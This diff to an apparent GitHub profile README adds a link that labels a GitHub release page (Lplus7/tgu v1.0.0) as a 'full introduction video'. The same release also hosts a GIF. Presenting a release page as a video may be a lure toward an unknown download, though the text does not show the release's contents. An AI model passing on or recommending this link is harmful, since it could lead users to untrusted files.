@@ -1,6 +1,6 @@
 # 💫 About Me:
 
-👨‍💻 Allow me to introduce myself! Please watch my full introduction video!<br><br>🌱 I’m 24 yo and now currently learning Java QA Automation +SQL +API +Unit Testing<br><br>📫 How to reach me atom.vlg@bk.ru
+👨‍💻 Allow me to introduce myself! Please watch my [full introduction video](https://github.com/Lplus7/tgu/releases/tag/v1.0.0)!<br><br>🌱 I’m 24 yo and now currently learning Java QA Automation +SQL +API +Unit Testing<br><br>📫 How to reach me atom.vlg@bk.ru
 <img align="center" alt="gif22mb" width="1280" src="https://github.com/Lplus7/tgu/releases/download/v1.0.0/anilow-57.gif">
 
 ## 🌐 Socials:
